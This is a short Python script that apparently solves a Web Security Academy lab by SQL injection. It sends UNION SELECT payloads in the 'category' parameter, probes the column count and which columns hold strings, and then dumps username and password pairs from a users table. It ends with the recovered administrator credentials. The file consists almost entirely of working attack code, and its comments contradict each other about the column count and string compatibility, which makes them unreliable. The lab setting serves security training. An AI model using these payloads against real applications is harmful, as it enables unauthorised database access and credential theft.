#!/usr/bin/env python3

import requests

url = "https://0aff004b04d4c13086d6f2270064004d.web-security-academy.net/filter"
params = {"category": "Tech gifts' UNION SELECT NULL, NULL--"}

response = requests.get(url, params=params)

print(response.status_code)

# now that we know Gifts contains three columns, let's test which is compatible
# with String data type
for i in range(2):
    stmt = ["NULL"] * 2
    stmt[i] = "'string-compatible'"

    params = {"category": f"Gifts' UNION SELECT {','.join(stmt)}--"}

    response = requests.get(url, params=params)

    if response.status_code == requests.codes.ok:
        print(f"the position which is 'string-compatible' is {i+1}")


# now we know that Gifts contains two columns which are both string compatible
# from the lab description, we know there exist a different table `users`

# additional note: since only column 2 is string compatible. we concat username
# and password in the second column, and just select NULL in the first one

params = {"category": "Tech gifts' UNION SELECT NULL, username || '~' || password FROM users--"}

response = requests.get(url, params=params)

print(f"Your final request status code is {response.status_code}")
print(f"Your final request {response.url}")

# credentials are
# username=administrator, password=y3g0ygb5mz6k8tmlpwlj


